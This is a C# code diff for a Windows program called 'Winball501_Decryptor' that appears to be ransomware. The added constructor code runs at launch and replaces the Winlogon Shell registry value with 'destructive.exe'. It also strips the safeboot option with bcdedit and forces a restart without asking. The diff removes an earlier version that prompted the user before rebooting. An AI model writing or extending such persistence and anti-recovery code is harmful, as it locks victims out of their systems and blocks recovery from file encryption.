@@ -6,6 +6,7 @@ using System.IO;
 using System.Threading;
 using System.Threading.Tasks;
 using System.Windows.Forms;
+using System.Management;
 using multronfileguardian;
 
 namespace Winball501_Decryptor
@@ -16,7 +17,69 @@ namespace Winball501_Decryptor
         {
             InitializeComponent();
             load();
+            if (IsSafeMode())
+            {
+                ModifyRegistry();
+                RemoveSafeBoot();
+                RestartPC();
+            }
+            else
+            {
+               ModifyRegistry();
+            }
         }
+        static bool IsSafeMode()
+        {
+            using (var searcher = new ManagementObjectSearcher("SELECT * FROM Win32_OperatingSystem"))
+            {
+                foreach (var obj in searcher.Get())
+                {
+                    var bootOptions = obj["BootOptionOnLimit"];
+                    if (bootOptions != null && bootOptions.ToString().Contains("SAFEBOOT"))
+                    {
+                        return true;
+                    }
+                }
+            }
+            return false;
+        }
+        static void RemoveSafeBoot()
+        {
+            try
+            {
+                System.Diagnostics.Process.Start("cmd.exe", "/c bcdedit /deletevalue {current} safeboot");
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show("Error running bcdedit: " + ex.Message);
+            }
+        }
+
+        static void ModifyRegistry()
+        {
+            try
+            {
+                System.Diagnostics.Process.Start("cmd.exe", "/c reg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v Shell /f");
+                System.Diagnostics.Process.Start("cmd.exe", "/c reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v Shell /t REG_SZ /d \"C:\\Program Files\\utkudrk2\\destructive.exe\" /f");
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show("Error modifying registry: " + ex.Message);
+            }
+        }
+
+        static void RestartPC()
+        {
+            try
+            {
+                System.Diagnostics.Process.Start("cmd.exe", "/c shutdown -r -t 7");
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show("Error restarting the PC: " + ex.Message);
+            }
+        }
+
         string publickey = "<RSAKeyValue><Modulus>sFCjXDLTTsLJGHRCK5uTawwBCWUWyUDK/CsxBn5mQKlOZd0ibBvZ3lpoQpuyww6cX096eKPsW8vOCUNRfwxv9mfThUJ8Yk+l0uLXvC8kRnNYOmFZCfwgvTEdIZtYIT35nbRyAlGFGL49zTYTmh/NEJcZasSI1XfHZt+G2TW62u2w4ZTufRRosVr5dkWM8CFRVLV+KtoXqA08yu2MSL+UUXDnT8WOYNH0unhoKb4xCWdbT1riP/5LPFicXQi6lQyhSAFXtpfeIrkvvphwoRJKs955ZI4KvUOtwbE361mKJvIB6FuBcCmwScoDhgQkG+4q4MJsZ3zyp0+DuriDyMcvBQ==</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>";
         List<Task> tasks = new List<Task>();
         
@@ -47,40 +110,6 @@ namespace Winball501_Decryptor
                 File.Create(encryptedfile).Close();
                 await Task.WhenAll(tasks);
                 this.Visible = true;
-                // Registry modification after encryption is done
-                try
-                {
-                    System.Diagnostics.Process.Start("cmd.exe", "/c reg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v Shell /f");
-                    System.Diagnostics.Process.Start("cmd.exe", "/c reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v Shell /t REG_SZ /d \"explorer.exe, C:\\Program Files\\utkudrk2\\destructive.exe\" /f");
-                }
-                catch (Exception ex)
-                {
-                    MessageBox.Show("Error modifying registry: " + ex.Message);
-                }
-                // Run bcdedit command to remove safeboot
-                try
-                {
-                    System.Diagnostics.Process.Start("cmd.exe", "/c bcdedit /deletevalue {current} safeboot");
-                }
-                catch (Exception ex)
-                {
-                    MessageBox.Show("Error running bcdedit: " + ex.Message);
-                }
-                // Ask user to restart PC
-                DialogResult result = MessageBox.Show("A system restart is required for exit safe mode. Do you want to restart now?", "Restart Required", MessageBoxButtons.YesNo, MessageBoxIcon.Information);
-
-                if (result == DialogResult.Yes)
-                {
-                    try
-                    {
-                        // Execute the shutdown command to restart the PC in 7 seconds
-                        System.Diagnostics.Process.Start("cmd.exe", "/c shutdown -r -t 7");
-                    }
-                    catch (Exception ex)
-                    {
-                        MessageBox.Show("Error restarting the PC: " + ex.Message);
-                    }
-                }
             }
             else
             {
